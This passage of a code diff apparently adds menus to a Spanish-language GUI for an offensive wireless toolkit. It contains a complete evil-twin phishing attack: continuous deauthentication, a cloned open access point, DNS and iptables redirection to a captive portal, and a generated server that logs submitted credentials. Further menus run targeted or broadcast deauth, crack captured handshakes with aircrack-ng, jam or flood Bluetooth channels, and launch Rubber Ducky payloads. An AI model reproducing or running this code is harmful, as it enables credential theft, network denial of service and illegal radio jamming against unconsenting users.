+        ctk.CTkLabel(self.main_frame, text="EVIL TWIN ACTIVO", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        ctk.CTkButton(self.main_frame, text="DETENER ATAQUE", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                      command=self._evil_twin_detener).pack(pady=5, fill="x", padx=10)
+        self.mostrar_consola()
+
+        self.evil_twin_stop = False
+
+        def ataque():
+            self._evil_twin_limpiar_procesos()
+            ap_iface = self.wifi_state["ap_iface"]
+            deauth_iface = self.wifi_state.get("deauth_iface")
+            mon_deauth = self.wifi_state.get("mon_deauth")
+
+            if not mon_deauth:
+                os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
+                mon_deauth = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
+                self.wifi_state["mon_deauth"] = mon_deauth
+
+            portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
+            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
+            os.makedirs(tmp_web, exist_ok=True)
+            os.system(f"cp -r {portals_dir}/{portal}/* {tmp_web}/ 2>/dev/null")
+
+            cred_log = os.path.join(session_dir, "credentials.log")
+            capture_script = f'''#!/usr/bin/env python3
+import http.server, urllib.parse, os, socketserver
+from datetime import datetime
+LOG = "{cred_log}"
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/" or self.path == "/index.html": self.path = "/index.html"
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length).decode()
+        params = urllib.parse.parse_qs(data)
+        with open(LOG, "a") as f: f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
+        self.send_response(302); self.send_header("Location", "/success.html"); self.end_headers()
+    def log_message(self, format, *args): pass
+
+if __name__ == "__main__":
+    os.chdir("{tmp_web}")
+    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd: httpd.serve_forever()
+'''
+            with open(f"{tmp_web}/capture.py", "w") as f: f.write(capture_script)
+            if not os.path.exists(f"{tmp_web}/success.html"):
+                with open(f"{tmp_web}/success.html", "w") as f: f.write('<html><body><h2>OK</h2></body></html>')
+
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
+            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            with open("/tmp/hostapd_evil.conf", "w") as f: f.write(hostapd_conf)
+
+            self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(3)
+
+            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+
+            dnsmasq_conf = f"interface={ap_iface}\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
+            with open("/tmp/dnsmasq_evil.conf", "w") as f: f.write(dnsmasq_conf)
+            self.evil_twin_procs['dnsmasq'] = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(2)
+
+            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+
+            self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1)
+
+            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
+            if deauth_mode == "directed" and cliente_mac: deauth_cmd.extend(["-c", cliente_mac])
+            deauth_cmd.append(mon_deauth)
+            self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            last_lines = 0
+            while not self.evil_twin_stop:
+                time.sleep(2)
+                if os.path.exists(cred_log):
+                    with open(cred_log, "r") as f:
+                        lines = f.readlines()
+                        if len(lines) > last_lines:
+                            for line in lines[last_lines:]: self.escribir_consola(f"[+] Cred: {line.strip()}")
+                            last_lines = len(lines)
+
+            self._evil_twin_detener_procesos()
+            self._evil_twin_limpiar_iptables(ap_iface)
+            self.escribir_consola("[+] Evil Twin detenido.")
+
+        self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
+        self.evil_twin_thread.start()
+
+    def _evil_twin_detener(self):
+        self.evil_twin_stop = True
+
+    def _evil_twin_detener_procesos(self):
+        for nombre, proc in self.evil_twin_procs.items():
+            if proc is not None:
+                try: proc.terminate(); proc.wait(timeout=5)
+                except: proc.kill()
+                self.evil_twin_procs[nombre] = None
+
+    def _evil_twin_limpiar_procesos(self):
+        self._evil_twin_detener_procesos()
+        os.system("sudo pkill -f 'hostapd.*evil' 2>/dev/null")
+        os.system("sudo pkill -f 'dnsmasq.*evil' 2>/dev/null")
+        os.system("sudo pkill -f 'capture.py' 2>/dev/null")
+        os.system("sudo pkill -f 'aireplay-ng' 2>/dev/null")
+
+    def _evil_twin_limpiar_iptables(self, ap_iface):
+        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+        if ap_iface:
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
+
+    def _wifi_deauth(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ctk.CTkLabel(self.main_frame, text="DEAUTH - IFace", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        for iface in self.obtener_interfaces_red():
+            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                         command=lambda i=iface: self._deauth_escanear(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _deauth_escanear(self, iface):
+        self.wifi_state = {"iface": iface}
+        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
+        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
+        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
+        self.wifi_state["mon_iface"] = mon
+        scan_prefix = self._generar_nombre_temporal("deauth_scan")
+        os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+        redes = []
+        try:
+            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                for linea in f.read().split("\n")[2:]:
+                    r = linea.split(",")
+                    if len(r) >= 14 and ":" in r[0]: redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
+        except: pass
+        finally:
+            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                try: os.remove(f"{scan_prefix}{ext}")
+                except: pass
+        self.after(0, lambda: self._deauth_mostrar_redes(redes))
+
+    def _deauth_mostrar_redes(self, redes):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth)
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for red in redes:
+            texto = f"{red['essid']} (CH:{red['ch']})"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda r=red: self._deauth_seleccionar_modo(r)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _deauth_seleccionar_modo(self, red):
+        self.wifi_state["target"] = red
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth)
+        ctk.CTkLabel(self.main_frame, text="MODO DE ATAQUE", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        ctk.CTkButton(self.main_frame, text="Broadcast (Todos)", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                     command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF")).pack(fill="x", padx=10, pady=5)
+        ctk.CTkButton(self.main_frame, text="Cliente específico", fg_color=COLOR_BOTON_ROJO, height=35,
+                     command=lambda: self._deauth_escanear_clientes(red)).pack(fill="x", padx=10, pady=5)
+        self.mostrar_consola()
+
+    def _deauth_escanear_clientes(self, red):
+        mon = self.wifi_state["mon_iface"]
+        scan_prefix = self._generar_nombre_temporal("deauth_clients")
+        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+        clientes = []
+        try:
+            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                partes = f.read().split("Station MAC,")
+                if len(partes) > 1:
+                    for linea in partes[1].split("\n")[1:]:
+                        c = linea.split(",")
+                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
+        except: pass
+        finally:
+            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                try: os.remove(f"{scan_prefix}{ext}")
+                except: pass
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA CLIENTE", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for mac in clientes:
+            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                         command=lambda m=mac: self._deauth_ejecutar(m)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _deauth_ejecutar(self, cliente):
+        red = self.wifi_state["target"]
+        mon = self.wifi_state["mon_iface"]
+        self.ejecutar_comando(f"sudo iw dev {mon} set channel {red['ch']} 2>/dev/null")
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_deauth)
+        ctk.CTkLabel(self.main_frame, text="INTENSIDAD", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        for texto, count in [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]:
+            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, height=35,
+                        command=lambda c=count: self.ejecutar_comando(
+                            f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
+                        )).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _wifi_explorar_handshakes(self):
+        self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS", self.show_wifi_menu)
+
+    def _wifi_explorar_evil(self):
+        self._mostrar_explorador_generico(BASE_DIR_EVIL, "EVIL TWIN RES", self.show_wifi_menu)
+
+    def _mostrar_explorador_generico(self, base_dir, titulo, callback_volver):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(callback_volver)
+        ctk.CTkLabel(self.main_frame, text=titulo, font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        if not os.path.exists(base_dir): os.makedirs(base_dir)
+        carpetas = sorted([d for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d))], reverse=True)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for carpeta in carpetas:
+            ruta = os.path.join(base_dir, carpeta)
+            ctk.CTkButton(frame, text=carpeta, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda r=ruta: self._mostrar_archivos_generico(r, callback_volver)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _mostrar_archivos_generico(self, ruta, callback_volver):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._mostrar_explorador_generico(os.path.dirname(ruta), "", callback_volver))
+        nombre = os.path.basename(ruta)
+        ctk.CTkLabel(self.main_frame, text=f"{nombre}", font=ctk.CTkFont(size=12, weight="bold")).pack(pady=5)
+        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for archivo in archivos:
+            ruta_arch = os.path.join(ruta, archivo)
+            if archivo.endswith('.cap'):
+                btn = ctk.CTkButton(frame, text=archivo, fg_color="#2b2b2b", height=28, command=lambda ra=ruta_arch: self.ejecutar_comando(f"aircrack-ng '{ra}'"))
+            else:
+                btn = ctk.CTkButton(frame, text=archivo, fg_color="#2b2b2b", height=28, command=lambda ra=ruta_arch: self.ejecutar_comando(f"cat '{ra}'"))
+            btn.pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    # ==========================================
+    # MENÚ BLUETOOTH BLE
+    # ==========================================
+    def show_bluetooth_menu(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ctk.CTkLabel(self.main_frame, text="AUDITORÍA BLUETOOTH", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+
+        gadget_status = "Conectado" if self.gadget_available else "Desconectado"
+        ctk.CTkLabel(self.main_frame, text=f"Gadget: {gadget_status}",
+                     text_color="#00ff00" if self.gadget_available else "#ff4d4d",
+                     font=ctk.CTkFont(size=10)).pack(pady=2)
+
+        btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        btn_frame.pack(fill="x", padx=5, pady=2)
+
+        if self.gadget_available:
+            opciones = [
+                ("Scan BLE (HSPI)", lambda: self._ble_scan_gadget(0)),
+                ("Scan BLE (VSPI)", lambda: self._ble_scan_gadget(1)),
+                ("Bluejacking", self._bluejacking_gui),
+                ("Beacon Flood", self._beacon_flood_gui),
+                ("Jammer", self._jammer_gui),
+                ("Barrido Jammer", self._sweep_jammer_gui),
+                ("Detener Gadget", self._gadget_stop_all),
+                ("Estado Gadget", self._gadget_status)
+            ]
+        else:
+            opciones = [("Scan Dispositivos BLE", self._ble_escanear)]
+            
+        for text, cmd in opciones:
+            ctk.CTkButton(btn_frame, text=text, fg_color=COLOR_BOTON_PELIGRO if "Detener" in text else COLOR_BOTON_ROJO, 
+                          hover_color=COLOR_BOTON_HOVER, height=35, command=cmd).pack(fill="x", pady=2)
+
+        ctk.CTkButton(self.main_frame, text="Explorar Resultados", fg_color="#4a4a4a", height=35,
+                      command=lambda: self._mostrar_explorador_generico(BASE_DIR_BLE, "RESULTADOS BLE", self.show_bluetooth_menu)
+                      ).pack(fill="x", padx=10, pady=5)
+
+        self.mostrar_consola()
+
+    def _ble_scan_gadget(self, module):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO (MOD {module})...", font=ctk.CTkFont(size=14)).pack(pady=5)
+        self.mostrar_consola()
+        
+        def callback(devices):
+            self.after(0, lambda: self._ble_gadget_mostrar_dispositivos(devices, module))
+        self.gadget.scan(module, 10, callback)
+
+    def _ble_gadget_mostrar_dispositivos(self, dispositivos, module):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text="DISPOSITIVOS (Gadget)", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for dev in dispositivos:
+            texto = f"{dev['name'][:15]} ({dev['mac']})"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                                command=lambda d=dev: self._ble_acciones(d)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _bluejacking_gui(self):
+        dialog = ctk.CTkInputDialog(text="Mensaje advertising:", title="Bluejacking")
+        msg = dialog.get_input()
+        if msg:
+            self.gadget.advertise(0, msg)
+            self.limpiar_main_frame()
+            self.agregar_boton_atras(self.show_bluetooth_menu)
+            ctk.CTkLabel(self.main_frame, text="Publicidad activa.", font=ctk.CTkFont(size=14)).pack(pady=10)
+            ctk.CTkButton(self.main_frame, text="Detener", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                          command=lambda: self.gadget.stop(0)).pack(pady=5)
+            self.mostrar_consola()
+
+    def _beacon_flood_gui(self):
+        dialog_count = ctk.CTkInputDialog(text="Beacons:", title="Flood")
+        count = int(dialog_count.get_input() or 50)
+        dialog_interval = ctk.CTkInputDialog(text="Intervalo(ms):", title="Flood")
+        interval = int(dialog_interval.get_input() or 200)
+
+        self.gadget.beacon_flood(0, count, interval)
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text="Flood en curso...", font=ctk.CTkFont(size=14)).pack(pady=10)
+        ctk.CTkButton(self.main_frame, text="Detener", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                      command=lambda: self.gadget.stop(0)).pack(pady=5)
+        self.mostrar_consola()
+
+    def _jammer_gui(self):
+        dialog_ch = ctk.CTkInputDialog(text="Canal(0-78):", title="Jammer")
+        ch_str = dialog_ch.get_input()
+        if not ch_str: return
+        dialog_dur = ctk.CTkInputDialog(text="Segundos:", title="Jammer")
+        dur_str = dialog_dur.get_input()
+        if not dur_str: return
+
+        self.gadget.jam(0, int(ch_str), int(dur_str))
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text=f"Jamming canal {ch_str}", font=ctk.CTkFont(size=14)).pack(pady=10)
+        ctk.CTkButton(self.main_frame, text="Detener", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                      command=lambda: self.gadget.stop(0)).pack(pady=5)
+        self.mostrar_consola()
+
+    def _sweep_jammer_gui(self):
+        dialog_dur = ctk.CTkInputDialog(text="Segundos:", title="Barrido")
+        dur_str = dialog_dur.get_input()
+        if not dur_str: return
+
+        self.gadget.sweep_jam(0, int(dur_str))
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text="Barrido activo", font=ctk.CTkFont(size=14)).pack(pady=10)
+        ctk.CTkButton(self.main_frame, text="Detener", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                    command=lambda: self.gadget.stop(0)).pack(pady=5)
+        self.mostrar_consola()
+
+    def _gadget_stop_all(self):
+        self.gadget.stop(0)
+        self.gadget.stop(1)
+
+    def _gadget_status(self):
+        if self.gadget_available: self.escribir_consola(f"[+] Estado gadget: {self.gadget.status()}")
+
+    def _ble_escanear(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text="ESCANEANDO BLE...", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=10)
+        self.mostrar_consola()
+
+        def escanear():
+            os.system("sudo hciconfig hci0 up 2>/dev/null")
+            os.system("sudo bluetoothctl power on 2>/dev/null")
+            os.system("sudo bluetoothctl scan on &")
+            time.sleep(12)
+            os.system("sudo bluetoothctl scan off 2>/dev/null")
+            dispositivos = []
+            try:
+                output = subprocess.check_output("sudo bluetoothctl devices", shell=True, text=True)
+                for line in output.splitlines():
+                    if "Device" in line:
+                        parts = line.strip().split(' ', 2)
+                        if len(parts) >= 3: dispositivos.append({"mac": parts[1], "nombre": parts[2]})
+            except: pass
+            self.after(0, lambda: self._mostrar_dispositivos_ble(dispositivos))
+        threading.Thread(target=escanear, daemon=True).start()
+
+    def _mostrar_dispositivos_ble(self, dispositivos):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_bluetooth_menu)
+        ctk.CTkLabel(self.main_frame, text="DISPOSITIVOS BLE", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for dev in dispositivos:
+            texto = f"{dev['nombre'][:15]} ({dev['mac']})"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                                command=lambda d=dev: self._ble_conectar_legacy(d['mac'])).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _ble_conectar_legacy(self, mac):
+        self.escribir_consola(f"[*] Conectando a {mac}...")
+        def conectar():
+            try:
+                subprocess.run(f"sudo bluetoothctl pair {mac}", shell=True, timeout=30)
+                subprocess.run(f"sudo bluetoothctl connect {mac}", shell=True, timeout=30)
+                self.escribir_consola(f"[+] Conectado a {mac}")
+            except Exception as e: self.escribir_consola(f"[!] Error: {e}")
+        threading.Thread(target=conectar, daemon=True).start()
+
+    # ==========================================
+    # MENÚ RUBBER DUCKY
+    # ==========================================
+    def show_ducky_menu(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ctk.CTkLabel(self.main_frame, text="PAYLOADS DUCKY", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        payloads_dir = "payloads"
+        os.makedirs(payloads_dir, exist_ok=True)
+        archivos = [f for f in os.listdir(payloads_dir) if f.endswith(".txt")]
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for archivo in archivos:
+            ruta = os.path.join(payloads_dir, archivo)
+            ctk.CTkButton(frame, text=archivo, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                               command=lambda r=ruta: self._ejecutar_ducky(r)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _ejecutar_ducky(self, ruta):
+        self.escribir_consola(f"\n[+] Exec: {os.path.basename(ruta)}")
+        def run():
+            time.sleep(2)
+            try:
+                ducky_logic.ejecutar_script_ducky(ruta)
+                self.escribir_consola("[+] Hecho.")
+            except Exception as e: self.escribir_consola(f"[!] Error: {e}")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ==========================================
+    # MENÚ UTILIDADES 
+    # ==========================================
+    def show_utils_menu(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ctk.CTkLabel(self.main_frame, text="UTILIDADES", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+
+        # Usar botones compactos apilados verticalmente
+        opciones = [
+            ("Conectar a Red WiFi", self._utils_wifi_seleccionar_interfaz),
+            ("Estado de Red WiFi", self._utils_wifi_estado),
+            ("Conectar Dispositivo BT", self._utils_bluetooth_seleccionar_interfaz),
+            ("Estado de Adaptador BT", self._utils_bluetooth_estado)
+        ]
+        
+        for texto, cmd in opciones:
+            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35, command=cmd).pack(fill="x", padx=10, pady=2)
+
+        ctk.CTkLabel(self.main_frame, text="SISTEMA", font=ctk.CTkFont(size=12, weight="bold"), text_color="#ff4d4d").pack(pady=(5,2))
+        
+        btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        btn_frame.pack(fill="x", padx=5, pady=2)
+        
+        comandos_sys = [
+            ("Almacenamiento", "df -h"), ("Memoria RAM", "free -h"),
+            ("Top CPU", "ps aux --sort=-%cpu | head -6"), ("Conexiones", "ss -tulnp | head -10")
+        ]
+        for nombre, cmd in comandos_sys:
+            ctk.CTkButton(btn_frame, text=nombre, fg_color="#4a4a4a", hover_color="#2b2b2b", height=28,
+                         command=lambda c=cmd: self.ejecutar_comando(c)).pack(fill="x", pady=2)
+
+        sys_opts = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        sys_opts.pack(fill="x", padx=5, pady=5)
+        sys_opts.grid_columnconfigure((0,1), weight=1)
+        
+        ctk.CTkButton(sys_opts, text="REINICIAR", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                     command=lambda: os.system("reboot")).grid(row=0, column=0, padx=2, sticky="ew")
+        ctk.CTkButton(sys_opts, text="APAGAR", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                     command=lambda: os.system("shutdown -h now")).grid(row=0, column=1, padx=2, sticky="ew")
+
+        self.mostrar_consola()
+
+    # -------------------- UTILIDADES WiFi --------------------
+    def obtener_interfaces_wifi(self):
+        interfaces = []
+        try:
+            output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
+            for line in output.splitlines(): interfaces.append(line.split()[-1])
+        except: pass
+        return interfaces if interfaces else []
+
+    def _utils_wifi_seleccionar_interfaz(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_utils_menu)
+        ctk.CTkLabel(self.main_frame, text="IFACE WIFI", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        for iface in self.obtener_interfaces_wifi():
+            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                         command=lambda i=iface: self._utils_wifi_escanear_redes(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _utils_wifi_escanear_redes(self, iface):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="ESCANEANDO...", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        self.mostrar_consola()
+
+        def escanear():
+            os.system(f"nmcli device wifi rescan ifname {iface} 2>/dev/null")
+            time.sleep(2)
+            try:
+                output = subprocess.check_output(f"nmcli -t -f SSID,SECURITY,SIGNAL device wifi list ifname {iface}", shell=True, text=True, stderr=subprocess.DEVNULL)
+                redes = []
+                for line in output.strip().split('\n'):
+                    if not line.strip(): continue
+                    parts = line.split(':')
+                    if len(parts) >= 3: redes.append({"ssid": parts[0] or "<Oculta>", "security": parts[1] or "Ninguna", "signal": parts[2]})
+                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, redes))
+            except Exception as e: self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, []))
+        threading.Thread(target=escanear, daemon=True).start()
+
+    def _utils_wifi_mostrar_redes(self, iface, redes):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
+        ctk.CTkLabel(self.main_frame, text="REDES", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for red in redes:
+            texto = f"{red['ssid']} | {red['signal']}%"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda r=red: self._utils_wifi_conectar(iface, r['ssid'], r['security'])).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _utils_wifi_conectar(self, iface, ssid, security):
+        if security and security.lower() != "none" and "wep" not in security.lower():
+            dialog = ctk.CTkInputDialog(text=f"Password para '{ssid}':", title="WiFi")
+            password = dialog.get_input()
+            if not password: return
